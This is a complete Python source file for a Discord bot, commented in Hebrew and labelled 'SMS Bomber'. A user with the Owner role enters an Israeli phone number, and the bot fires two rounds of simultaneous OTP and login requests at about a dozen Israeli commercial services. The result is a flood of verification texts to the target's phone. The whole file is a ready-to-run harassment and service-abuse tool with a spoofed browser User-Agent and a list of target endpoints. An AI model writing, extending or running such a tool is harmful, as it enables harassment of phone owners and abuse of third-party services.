import discord
from discord.ext import commands
import os
import httpx
import asyncio

# משיכת הטוקן מהגדרות ה-Render (חשוב!)
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"

class SpamView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.primary, emoji="🚀", custom_id="spam_btn")
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # בדיקת רול Owner
        role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        if not role:
            return await interaction.response.send_message("❌ רק מי שיש לו רול Owner יכול להפעיל!", ephemeral=True)
        await interaction.response.send_modal(SpamModal())

class SpamModal(discord.ui.Modal, title="SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        phone_val = self.phone.value
        await interaction.response.send_message(f"💣 הפצצה על {phone_val} יוצאת לדרך...", ephemeral=True)
        
        # מאגר הכתובות המלא
        endpoints = [
            {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
            {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
            {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
            {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
            {"url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"url": "https://shoppers-api.super-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
            {"url": "https://ksp.co.il/api/v1/auth/send-otp", "json": {"phone": phone_val}},
            {"url": "https://www.ivory.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
            {"url": "https://www.azrieli.com/api/v1/auth/otp", "json": {"phone": phone_val}}
        ]

        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}

        async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
            for _ in range(2): # 2 סבבים
                tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(5)

        await interaction.followup.send(f"✅ ההפצצה על {phone_val} הסתיימה!", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self):
        # הגדרת Intents כדי שהבוט יוכל לזהות פקודות ורולים
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True 
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())

bot = MyBot()

@bot.command()
@commands.has_role(OWNER_ROLE_NAME)
async def setup(ctx):
    embed = discord.Embed(
        title="Spam sms bomber | Admin Panel",
        description="**👑 Owner Access Only**\nClick below to start.",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed, view=SpamView())

if __name__ == "__main__":
    if not TOKEN:
        print("❌ שגיאה: לא נמצא DISCORD_TOKEN ב-Environment Variables!")
    else:
        bot.run(TOKEN)
